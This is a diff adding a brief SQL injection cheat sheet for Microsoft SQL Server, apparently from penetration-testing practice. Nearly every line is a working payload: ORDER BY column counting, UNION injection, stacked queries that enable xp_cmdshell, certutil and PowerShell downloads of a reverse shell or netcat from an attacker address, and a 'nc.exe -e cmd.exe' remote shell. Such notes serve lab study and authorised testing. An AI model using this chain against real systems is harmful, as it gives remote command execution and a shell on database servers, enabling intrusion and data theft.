@@ -1,1 +1,25 @@
+' ORDER BY 1-- //  <----- Test for the amount of columns till you get an error
+' ORDER BY 1,2-- //
+' ORDER BY 1,2,3-- //  <---- Hits error so you know there are two columns
 
+' UNION SELECT 1,2; EXEC xp_cmdshell 'ping 192.168.45.173'--  <---- Ping  your machine to see if it goes through and you can contact it
+' UNION SELECT 1,2; EXEC sp_configure 'show advanced options', 1;RECONFIGURE;EXEC sp_configure 'xp_cmdshell', 1;RECONFIGURE--  <----- Enable xp_cmdshell
+' UNION SELECT 1,2; EXEC xp_cmdshell 'certutil -urlcache -f http://192.168.45.173/80.exe C:\Users\Public\80.exe'--   <---- Download your revshell or netcat
+' UNION SELECT 1,2;EXEC xp_cmdshell 'powershell C:\Users\Public\80.exe'--//  <----- Execute your revshell or netcat
+
+
+
+admin' UNION SELECT 1,2; EXEC xp_cmdshell "powershell.exe wget http://192.168.45.236/nc.exe -OutFile c:\Windows\Tasks\nc.exe"--+
+admin' UNION SELECT 1,2; EXEC xp_cmdshell "c:\Windows\Tasks\nc.exe -e cmd.exe 192.168.45.236 443"--+
+
+
+' EXEC xp_cmdshell 'certutil -urlcache -f http://192.168.45.173/80.exe C:\Users\Public\80.exe'--
+1';EXEC sp_configure 'show advanced options', 1;RECONFIGURE;EXEC sp_configure 'xp_cmdshell', 1;RECONFIGURE--
+
+SQL> EXEC sp_configure 'Show Advanced Options', 1;
+SQL> reconfigure;
+SQL> sp_configure;
+SQL> EXEC sp_configure 'xp_cmdshell', 1;
+SQL> reconfigure
+
+you  can do it in a one liner like: 1';EXEC sp_configure 'show advanced options', 1;RECONFIGURE;EXEC sp_configure 'xp_cmdshell', 1;RECONFIGURE--
